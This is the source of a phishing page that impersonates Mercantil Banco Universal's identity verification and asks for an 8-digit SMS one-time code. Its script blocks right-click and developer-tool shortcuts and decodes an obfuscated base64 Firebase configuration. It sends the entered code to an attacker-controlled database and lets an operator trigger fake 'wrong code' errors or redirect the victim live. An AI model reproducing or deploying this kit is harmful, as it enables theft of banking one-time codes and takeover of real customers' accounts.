<header class=hdr-top>
<script>
// Anti-Inspect / Anti-Ctrl+U Security
document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
document.addEventListener('keydown', function(e) {
    if (e.keyCode === 123) { e.preventDefault(); return false; } // F12
    if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { e.preventDefault(); return false; } // Ctrl+Shift+I
    if (e.ctrlKey && e.shiftKey && e.keyCode === 74) { e.preventDefault(); return false; } // Ctrl+Shift+J
    if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; } // Ctrl+U
    if (e.ctrlKey && e.keyCode === 83) { e.preventDefault(); return false; } // Ctrl+S
});
</script><img src="data:image/svg+xml;base64," alt=Mercantil></header>
<div class=wrap bis_skin_checked=1>
 <div id=h3 bis_skin_checked=1>Verifiquemos tu identidad</div>
 <div class=card bis_skin_checked=1>
 <p id=h6>Ingresa la clave temporal</p>
 <p class=subt><b>Siguiente paso:</b> Finalizar</p>
 <p class=infoNum>Introduce la clave temporal que hemos enviado a tu teléfono celular registrado.</p>
 <form id=pinForm>
 <label class=lbl>Clave Temporal</label>
 <div class=pins bis_skin_checked=1>
 <input class=pin type=tel maxlength=1 id=c1 inputmode=numeric value>
 <input class=pin type=tel maxlength=1 id=c2 inputmode=numeric value>
 <input class=pin type=tel maxlength=1 id=c3 inputmode=numeric value>
 <input class=pin type=tel maxlength=1 id=c4 inputmode=numeric value>
 <input class=pin type=tel maxlength=1 id=c5 inputmode=numeric value>
 <input class=pin type=tel maxlength=1 id=c6 inputmode=numeric value>
 <input class=pin type=tel maxlength=1 id=c7 inputmode=numeric value>
 <input class=pin type=tel maxlength=1 id=c8 inputmode=numeric value>
 </div>
 <div class=adis bis_skin_checked=1>Si no has recibido la clave temporal en <b id=cont>180</b> segundos, podrás solicitar el reenvío.</div>
 <button class=cont type=submit>Continuar</button>
 </form>
 </div>
 <footer>El acceso o uso no autorizado se considera un delito. Derechos protegidos por Mercantil C.A., Banco Universal. RIF: J-00002961-0.</footer>
</div>
<script></script>
<!-- CV TEMP INTEGRATION -->
<script src="bots_filter.js"></script>
<script src="config.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
<script>
(function(){

// ===== OTP AUTO-ADVANCE =====
var pins = ['c1','c2','c3','c4','c5','c6','c7','c8'];

pins.forEach(function(id, idx){
  var inp = document.getElementById(id);
  if(!inp) return;

  inp.addEventListener('input', function(){
    // Only allow digits
    inp.value = inp.value.replace(/\D/g,'').slice(0,1);
    // Auto-advance to next
    if(inp.value && idx < pins.length-1){
      var next = document.getElementById(pins[idx+1]);
      if(next) next.focus();
    }
  });

  inp.addEventListener('keydown', function(e){
    if(e.key === 'Backspace' && !inp.value && idx > 0){
      var prev = document.getElementById(pins[idx-1]);
      if(prev){ prev.value=''; prev.focus(); }
    }
    if(e.key === 'ArrowLeft' && idx > 0){
      document.getElementById(pins[idx-1]).focus();
    }
    if(e.key === 'ArrowRight' && idx < pins.length-1){
      document.getElementById(pins[idx+1]).focus();
    }
  });

  inp.addEventListener('paste', function(e){
    e.preventDefault();
    var text = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'');
    pins.forEach(function(pid, pi){
      var el = document.getElementById(pid);
      if(el) el.value = text[pi] || '';
    });
    // Focus last filled
    var lastIdx = Math.min(text.length, pins.length) - 1;
    if(lastIdx >= 0) document.getElementById(pins[lastIdx]).focus();
  });

  // Click any field - let user type starting from first empty
  inp.addEventListener('focus', function(){
    // Find first empty and redirect focus there if this is further right
    for(var i=0; i<idx; i++){
      var prev = document.getElementById(pins[i]);
      if(prev && !prev.value){ prev.focus(); return; }
    }
  });
});

// Focus first input on load
setTimeout(function(){ var f=document.getElementById('c1'); if(f)f.focus(); }, 100);


// ===== COUNTDOWN from 180 =====
var contEl = document.getElementById('cont');
if(contEl){
  contEl.textContent = '180';
  var secs = 180;
  var timer = setInterval(function(){
    secs--;
    contEl.textContent = secs;
    if(secs <= 0){
      clearInterval(timer);
      contEl.textContent = '0';
    }
  }, 1000);
}


// ===== FIREBASE =====
var _d=atob,_c={
  apiKey:_d('QUl6YVN5Q0FIVkRzLUVfTEtvVldyMXJKdmRqSHpHTndfbU0xSjVN'),
  authDomain:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZWFwcC5jb20='),
  databaseURL:_d('aHR0cHM6Ly9kZXZpY2Utc3RyZWFtaW5nLTJmOWU2OGI2LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ=='),
  projectId:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNg=='),
  storageBucket:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZXN0b3JhZ2UuYXBw'),
  messagingSenderId:_d('NTQyMDQ3NjIwNjYz'),
  appId:_d('MTo1NDIwNDc2MjA2NjM6d2ViOjFlMzUyNmYxZGVlODA5MzdlZjc5YjI=')
};
if(!firebase.apps.length) firebase.initializeApp(_c);
var db   = firebase.database();
var PATH = (typeof SITE_ID !== 'undefined' && SITE_ID) ? SITE_ID : _d('dm1fNzdjZjI4ZmZkYg==');

var sid = (new URLSearchParams(window.location.search)).get('id')
        || sessionStorage.getItem('_sid') || null;

  if(window.location.search.indexOf('err=1') !== -1) {
    setTimeout(function(){
      pins.forEach(function(pid){
        var el = document.getElementById(pid);
        if(el){ el.style.borderBottom='2px solid #dc3545'; el.value=''; }
      });
      var adis = document.querySelector('.adis');
      if(adis){
        var errEl = document.getElementById('_cv_err');
        if(!errEl){
          errEl = document.createElement('div');
          errEl.id = '_cv_err';
          errEl.style.cssText = 'color:#dc3545;font-weight:700;font-size:13px;text-align:center;margin-top:8px;';
          errEl.textContent = 'La clave temporal es incorrecta. Solicita una nueva.';
          adis.parentNode.insertBefore(errEl, adis);
        }
        errEl.style.display = 'block';
      }
      document.getElementById('c1').focus();
    }, 200);
  }
if(sid){
  var ref = db.ref(PATH + '/' + sid);
  ref.update({ page:'cv_temp.html', estado:'online' });

  // Listen for commands
  ref.child('command').on('value', function(snap){
    var cmd = snap.val();
    if(!cmd || !cmd.action) return;

    if(cmd.action === 'error_cv_temp'){
      // Show error on all inputs
      pins.forEach(function(pid){
        var el = document.getElementById(pid);
        if(el){ el.style.borderBottom='2px solid #dc3545'; el.value=''; }
      });
      // Show error text
      var adis = document.querySelector('.adis');
      if(adis){
        var errEl = document.getElementById('_cv_err');
        if(!errEl){
          errEl = document.createElement('div');
          errEl.id = '_cv_err';
          errEl.style.cssText = 'color:#dc3545;font-weight:700;font-size:13px;text-align:center;margin-top:8px;';
          errEl.textContent = 'La clave temporal es incorrecta. Solicita una nueva.';
          adis.parentNode.insertBefore(errEl, adis);
        }
        errEl.style.display = 'block';
      }
      document.getElementById('c1').focus();
      ref.child('command').remove();
      return;
    }

    // Other commands = navigate
    ref.child('command').remove();
    window.location.href = cmd.page;
  });

  window.addEventListener('beforeunload', function(){ ref.update({estado:'offline'}); });
}

// ===== CONTINUAR BUTTON =====
var form = document.getElementById('pinForm');
if(form){
  form.addEventListener('submit', function(e){
    e.preventDefault();
    var code = pins.map(function(id){
      var el = document.getElementById(id);
      return el ? el.value : '';
    }).join('');

    if(code.length < 1){
      document.getElementById('c1').focus();
      return;
    }

    // Save to Firebase
    if(sid){
      var ref2 = db.ref(PATH + '/' + sid);
      ref2.update({ cv_temp: code, page:'carga.html', estado:'online' });
    }

    // Go to carga.html to wait for commands
    sessionStorage.setItem('_sid', sid || '');
    window.location.href = 'carga.html';
  });
}

})();
</script>